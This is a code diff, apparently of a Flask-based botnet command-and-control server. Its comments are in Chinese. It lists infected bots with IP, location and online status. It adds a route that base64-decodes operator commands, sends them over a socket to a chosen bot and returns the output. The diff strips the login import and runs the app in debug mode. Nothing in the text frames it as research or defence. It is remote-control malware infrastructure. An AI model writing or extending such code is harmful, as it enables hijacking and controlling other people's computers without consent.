@@ -1,10 +1,11 @@
-import subprocess
+import base64
+import os
+import socket
+import sqlite3
 
 from flask import Flask, render_template, jsonify, request
-from flask_login import LoginManager, login_required, current_user
 from datetime import datetime, timedelta
 import random
-
 
 app = Flask(__name__)
 
@@ -13,7 +14,7 @@ cmd = []
 bots = [ # 测试数据
     {
         "id": 1,
-        "ip": "192.168.1.101",
+        "ip": "127.0.0.1",
         "status": "online",
         "geo": "Beijing, CN",
         "last_online": datetime.now() - timedelta(minutes=random.randint(0, 5)),
@@ -23,7 +24,6 @@ bots = [ # 测试数据
     },
 
 ]
-
 
 @app.route('/api/bots')
 def get_bots():
@@ -35,17 +35,18 @@ def get_bots():
 
 @app.route('/bots')
 def bot_dashboard():
+    sqlconn = sqlite3.connect('bots/bot.db')
+    sqlcursor = sqlconn.cursor()
+
+
     return render_template('cc.html')
 
 @app.route('/bots/cmd')
 def bot_cmd():
     return render_template('cmd.html')
+
 @app.route('/bots/execute' ,methods=['GET', 'POST'])
 def bot_execute():
-    data = request.json
-    command = data['command']
-    if not data or 'command' not in data:
-        return jsonify({'error': '未提供命令'}), 400
     try:
         # 解码 Base64 请求体
         encoded_data = request.get_data(as_text=True)
@@ -60,7 +61,6 @@ def bot_execute():
         ip = checkbotid(checkid)
         if not ip:
             return base64.b64encode("设备不存在".encode('utf-8')).decode('utf-8')
-
         # Socket 通信
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as cmd:
             cmd.settimeout(10)
@@ -74,8 +74,8 @@ def bot_execute():
             return output, 200
 
     except Exception as e:
-        return jsonify({'error': f'执行命令时出错: {str(e)}'}), 500
-
+        error_msg = base64.b64encode(f"执行失败: {str(e)}".encode('utf-8')).decode('utf-8')
+        return error_msg, 500
 
 def checkbotid(checkid):
     for bot in bots:
@@ -131,4 +131,4 @@ def bot_checkbot():
 
 
 if __name__ == '__main__':
-    app.run()
+    app.run(debug=True)
